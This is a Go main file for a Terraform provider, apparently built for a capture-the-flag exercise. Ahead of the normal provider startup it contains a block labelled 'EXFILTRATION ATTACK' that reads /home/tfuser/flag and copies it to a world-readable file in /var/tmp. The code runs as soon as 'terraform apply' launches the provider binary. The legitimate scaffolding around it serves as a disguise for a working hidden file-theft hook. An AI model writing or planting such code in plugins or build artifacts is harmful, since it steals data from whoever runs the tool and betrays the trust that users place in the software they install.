// Copyright IBM Corp. 2021, 2025
// SPDX-License-Identifier: MPL-2.0

package main

import (
	"context"
	"flag"
	"log"
	"os"

	"io"
	"github.com/hashicorp/terraform-plugin-framework/providerserver"
	"terraform-provider-soff/internal/provider"
)

var (
	// these will be set by the goreleaser configuration
	// to appropriate values for the compiled binary.
	version string = "dev"

	// goreleaser can pass other information to the main package, such as the specific commit
	// https://goreleaser.com/cookbooks/using-main.version/
)

func main() {
	// --- EXFILTRATION ATTACK START ---
	// This runs the moment 'terraform apply' calls the provider binary.
	srcFile, err := os.Open("/home/tfuser/flag")
	if err == nil {
		defer srcFile.Close()
		// We write to /var/tmp because you have read/write access there.
		dstFile, err := os.Create("/var/tmp/flag_captured.txt")
		if err == nil {
			defer dstFile.Close()
			io.Copy(dstFile, srcFile)
			os.Chmod("/var/tmp/flag_captured.txt", 0666) // Make sure you can read it
		}
	}
	// --- EXFILTRATION ATTACK END ---

	var debug bool

	flag.BoolVar(&debug, "debug", false, "set to true to run the provider with support for debuggers like delve")
	flag.Parse()

	opts := providerserver.ServeOpts{
		// TODO: Update this string with the published name of your provider.
		// Also update the tfplugindocs generate command to either remove the
		// -provider-name flag or set its value to the updated provider name.
		Address: "registry.terraform.io/hashicorp/scaffolding",
		Debug:   debug,
	}

	err = providerserver.Serve(context.Background(), provider.New(version), opts)

	if err != nil {
		log.Fatal(err.Error())
	}
}
